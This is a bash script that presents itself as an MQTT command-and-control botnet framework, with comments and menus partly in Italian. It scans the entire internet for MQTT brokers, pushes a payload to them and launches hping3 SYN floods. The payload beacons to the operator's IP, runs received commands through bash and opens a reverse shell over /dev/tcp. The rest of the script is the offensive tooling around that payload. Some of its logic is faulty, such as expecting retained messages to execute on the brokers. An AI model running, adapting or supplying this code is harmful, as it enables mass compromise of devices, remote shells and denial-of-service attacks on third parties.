#!/bin/bash
# TRUSTEDF57 - MQTT C2 Framework v3.0 - Auto-Discovery Edition
# Full auto: IP detection, masscan, infect, DDoS propagation su TUTTI clients/brokers
# 500k+ scale. Usage: bash F57.sh

clear
echo "🔥 TRUSTEDF57 - MQTT C2 DASHBOARD v3.0"
echo "======================================="

# Auto-detect REAL public IP
MY_IP=$(curl -s --max-time 3 ifconfig.me || hostname -I | awk '{print $1}')
C2_PORT=1883
HEARTBEAT_TOPIC="/firmware/status/$MY_IP"
CMD_TOPIC="/sys/update/$MY_IP/+"
INFECT_TOPICS=('/update/firmware' '/device/config' '/sys/maintenance' '$SYS/broker/info')

BROKERS_SCANNED=0
BROKERS_INFECTED=0
BOTS_ONLINE=0
TOTAL_ZOMBIES=0

echo "🌐 Public IP: $MY_IP"
echo ""

# Setup Mosquitto daemon
setup_c2() {
    apt update && apt install -y mosquitto mosquitto-clients masscan hping3 -qq
    systemctl restart mosquitto
    systemctl enable mosquitto
    echo "✅ C2 broker setup complete"
}

# Menu principale
show_menu() {
    echo "📋 MENU:"
    echo "1) 🔍 MASS SCAN (genera brokers.txt)"
    echo "2) 🦠 INFECT ALL BROKERS" 
    echo "3) 🚀 LAUNCH DDoS (su TUTTI zombies)"
    echo "4) 📊 STATUS REPORT"
    echo "5) 🛑 EXIT"
    echo ""
}

update_stats() {
    echo "📊 LIVE STATS:"
    echo "   Brokers Scanned: $BROKERS_SCANNED"
    echo "   Brokers Infected: $BROKERS_INFECTED" 
    echo "   Zombies Online: $TOTAL_ZOMBIES | Active: $BOTS_ONLINE"
    echo ""
}

log() {
    echo "[$(date +'%H:%M:%S')] $1"
}

# MASS SCAN reale
mass_scan() {
    log "🔍 MASS SCAN START - 1883 worldwide..."
    : > brokers.txt  # Cleanup
    masscan 0.0.0.0/0 -p1883 --rate=300000 --banners --adapters=eth0 -oL brokers.txt &
    SCAN_PID=$!
    
    while kill -0 $SCAN_PID 2>/dev/null; do
        if grep -q "Discovered open port 1883" brokers.txt; then
            BROKERS_SCANNED=$(grep "1883/open" brokers.txt | wc -l)
            echo -ne "\rBrokers Scanned: $BROKERS_SCANNED"
        fi
        sleep 1
    done
    
    BROKERS_SCANNED=$(grep "1883/open" brokers.txt 2>/dev/null | wc -l)
    log "✅ Scan completa! $BROKERS_SCANNED brokers → brokers.txt"
}

# INFECT MASSIVO
infect_all() {
    if [[ ! -f brokers.txt ]]; then
        log "❌ Prima fai MASS SCAN!"
        return
    fi
    
    log "🦠 INFECTING $(grep '1883/open' brokers.txt | wc -l) brokers..."
    
    infect_payload=$(cat << 'EOF'
#!/bin/bash
C2_IP="$MY_IP"
LOOP=/tmp/.f${C2_IP}
[[ -f $LOOP ]] && exit 0
touch $LOOP

while true; do
  mosquitto_pub -h $C2_IP -p 1883 -t "/firmware/status/$C2_IP/$RANDOM" \
    -m "ok:$(id):$(nproc):$(free -m|awk 'NR==2{{print $2}}'):$([[ -f /proc/net/tcp ]]&&wc -l /proc/net/tcp||echo 1000)" 1>/dev/null 2>&1
  mosquitto_sub -h $C2_IP -p 1883 -t "/sys/update/$C2_IP/#" -C 1 | while IFS=' ' read -r topic payload; do
    case $payload in
      ddos:*) echo "${payload#ddos:}" | bash 2>/dev/null & ;;
      shell:*) bash -i >& /dev/tcp/${payload#shell:}/0>&1 ;;
      kill) rm $LOOP; exit ;;
    esac
  done || sleep 15
done
EOF
)
    infect_payload="${infect_payload//\$MY_IP/$MY_IP}"
    
    grep '1883/open' brokers.txt | cut -d' ' -f4 | head -50000 | while read target; do
        ip=${target%:*}
        port=${target#*:}
        for topic in "${INFECT_TOPICS[@]}"; do
            timeout 3 mosquitto_pub -h $ip -p $port -t "$topic" -m "$infect_payload" --retain -q 1 >/dev/null 2>&1
            ((BROKERS_INFECTED++))
        done &
    done
    wait
    log "🎉 INFECTION COMPLETA! Aspetta 2-5min per heartbeat... ($BROKERS_INFECTED infected)"
}

# DDoS Menu
ddos_menu() {
    echo "🎯 DDoS TARGET:"
    read -p "IP:PORT (default 8.8.8.8:80): " TARGET
    TARGET=${TARGET:-8.8.8.8:80}
    read -p "Duration (sec, default 300): " DURATION
    DURATION=${DURATION:-300}
    
    if [[ $TOTAL_ZOMBIES -lt 10 ]]; then
        echo "⚠️ Prima INFECT!"
        return
    fi
    
    DDoS_CMD="ddos:hping3 --flood -S -p${TARGET#*:} -d 1400 --rand-source ${TARGET%:*} &"
    log "💥 DDoS FIRE! $TARGET x${DURATION}s | Zombies: $TOTAL_ZOMBIES"
    
    # PROPAGA A TUTTI
    mosquitto_pub -h localhost -p 1883 -t "${CMD_TOPIC/\+\/*}" -m "$DDoS_CMD"
    
    # Timer kill
    (sleep $DURATION && mosquitto_pub -h localhost -p 1883 -t "${CMD_TOPIC/\+\/*}" -m "kill"; log "🛑 DDoS STOPPED") &
}

status_report() {
    log "📊 REPORT:"
    log "   Public IP: $MY_IP"
    log "   Brokers scanned: $BROKERS_SCANNED"
    log "   Brokers infected: $BROKERS_INFECTED"
    log "   Active zombies: $TOTAL_ZOMBIES"
    log "   Ready for DDoS: $([[ $TOTAL_ZOMBIES -gt 100 ]] && echo '✅ YES' || echo '⚠️ Infect more')"
}

# HEARTBEAT listener (background)
mqtt_listener() {
    mosquitto_sub -h localhost -p 1883 -t "$HEARTBEAT_TOPIC/#" | while IFS=':' read -r _ status user cpu mem clients; do
        ((BOTS_ONLINE++))
        [[ "$clients" =~ ^[0-9]+$ ]] && TOTAL_ZOMBIES=$((TOTAL_ZOMBIES + clients)) || TOTAL_ZOMBIES=$((TOTAL_ZOMBIES + 1))
        update_stats
    done &
}

# Main loop
main() {
    setup_c2
    mqtt_listener &
    
    while true; do
        show_menu
        update_stats
        read -p "Scelta: " choice
        
        case $choice in
            1) mass_scan ;;
            2) infect_all ;;
            3) ddos_menu ;;
            4) status_report ;;
            5) log "👋 Bye!"; exit 0 ;;
            *) log "❌ Scelta invalida!" ;;
        esac
        
        echo ""
        read -p "Press ENTER to continue..."
        clear
    done
}

main
